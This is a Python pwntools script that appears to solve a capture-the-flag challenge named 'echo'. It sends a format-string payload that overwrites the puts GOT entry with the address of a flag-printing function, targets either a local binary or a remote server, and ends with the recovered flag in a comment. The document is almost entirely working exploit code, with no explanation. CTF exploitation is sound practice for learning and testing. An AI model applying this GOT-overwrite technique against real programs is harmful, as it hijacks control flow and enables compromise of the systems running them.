from pwn import *
import time
import sys
context.clear(arch = 'amd64')
def echo(DEBUG):
	if DEBUG=="1":
		r = process("./echo")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '125.235.240.168'
		PORT = 27015
		r = remote(HOST,PORT)
	
	
	puts_got = 0x601018
	flag = 0x4007B6
	offset = 8+3
	payload = "%1974u"+"%"+str(offset)+"$hn"
	payload += "%1000000000x" # >10s => alarm
	payload += p64(puts_got)
	r.sendline(payload) # puts_got -> flag
	
	r.interactive()

echo(sys.argv[1])

# matesctf{How_Can_You_Escape_My_Special_Exit_Function?}